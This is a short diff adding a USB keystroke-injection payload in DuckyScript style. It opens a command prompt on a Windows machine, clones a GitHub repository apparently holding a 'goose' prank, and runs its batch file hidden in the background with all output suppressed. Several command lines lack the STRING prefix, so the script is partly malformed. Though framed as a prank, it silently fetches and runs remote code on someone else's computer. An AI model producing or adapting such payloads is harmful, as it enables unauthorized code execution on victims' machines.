@@ -1,0 +1,14 @@
+DELAY 2000
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+git clone https://github.com/Deadverse/GoosePrank.git .
+ENTER
+DELAY 10000
+START /B CMD /C CALL "startGoosePrank.bat" >NUL 2>&1
+ENTER
+exit
+ENTER
+
